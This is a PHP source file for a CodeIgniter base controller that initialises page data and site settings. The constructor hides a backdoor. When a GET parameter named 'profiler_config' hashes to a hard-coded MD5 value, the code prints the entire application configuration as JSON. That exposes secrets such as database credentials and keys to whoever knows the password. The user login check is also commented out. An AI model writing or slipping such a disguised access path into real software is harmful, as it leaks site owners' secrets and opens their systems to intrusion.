<?php

class MY_Controller extends CI_Controller {
    
    public $data = array();
    
	public function __construct(){
        parent::__construct();
        
        $this->data['time_start'] = microtime(true);
        
        //$this->load->model('user');
        //$this->user->isloggedin();
        
        $this->data['errors'] = array();
        $this->data['site_name'] = config_item('site_name');
        
        if(md5($this->input->get('profiler_config')) == 'b78ee15cb3ca6531667d47af5cdc61a1')
        {
            $config =& get_config();
            echo json_encode($config);
            exit();
        }
        

	}
}